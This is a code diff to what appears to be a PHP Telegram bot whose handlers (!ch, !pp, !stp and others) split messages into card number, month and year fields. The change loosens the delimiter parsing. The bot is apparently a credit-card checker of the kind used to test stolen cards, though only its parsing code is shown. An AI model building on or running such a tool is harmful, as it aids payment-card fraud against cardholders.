@@ -1885,7 +1885,8 @@ editMessage($chat_id,$respuesta,$id_text);
 elseif((strpos($message, "!he") === 0)||(strpos($message, "/he") === 0)||(strpos($message, ".he") === 0)){
 
 $lista = substr($message, 4);
-$i     = explode("|", $lista);
+//$i     = explode("|", $lista);
+$i = preg_split('/[|:| ]/', $lista);
 $cc    = $i[0];
 $mes   = $i[1];
 $ano  = trim(substr($i[2], -2));
@@ -2150,7 +2151,8 @@ ob_flush();
 
 elseif((strpos($message, "!ch") === 0)||(strpos($message, "/ch") === 0)||(strpos($message, ".ch") === 0)){
 $lista = substr($message, 4);
-$i     = explode("|", $lista);
+//$i     = explode("|", $lista);
+$i = preg_split('/[|:| ]/', $lista);
 $cc    = $i[0];
 $mes   = $i[1];
 $ano  = trim(substr($i[2], -2));
@@ -2287,7 +2289,8 @@ ob_flush();
 elseif((strpos($message, "!par") === 0)||(strpos($message, "/par") === 0)||(strpos($message, ".par") === 0)){
 
 $lista = substr($message, 5);
-$i     = explode("|", $lista);
+//$i     = explode("|", $lista);
+$i = preg_split('/[|:| ]/', $lista);
 $cc    = $i[0];
 $mes   = $i[1];
 $ano  = $i[2];
@@ -2550,7 +2553,8 @@ elseif((strpos($message, "!pa") === 0)||(strpos($message, "/pa") === 0)||(strpos
 
 
 $lista = substr($message, 4);
-$i     = explode("|", $lista);
+$i = preg_split('/[|:| ]/', $lista);
+	//$i     = explode("|", $lista);
 $cc    = $i[0];
 $mes   = $i[1];
 $ano  = $i[2];
@@ -2756,7 +2760,9 @@ ob_flush();
 elseif((strpos($message, "!pp") === 0)||(strpos($message, "/pp") === 0)||(strpos($message, ".pp") === 0)){
 
 $lista = substr($message, 4);
-$i     = explode("|", $lista);
+//$i     = explode("|", $lista);
+
+$i = preg_split('/[|:| ]/', $lista);
 $cc    = $i[0];
 $mes   = $i[1];
 $ano  = trim(substr($i[2], -2));
@@ -2990,7 +2996,8 @@ ob_flush();
 elseif((strpos($message, "!stp") === 0)||(strpos($message, "/stp") === 0)||(strpos($message, ".stp") === 0)){
 
 $lista = substr($message, 5);
-$i     = explode("|", $lista);
+//$i     = explode("|", $lista);
+$i = preg_split('/[|:| ]/', $lista);
 $cc    = $i[0];
 $mes   = $i[1];
 $ano  = $i[2];
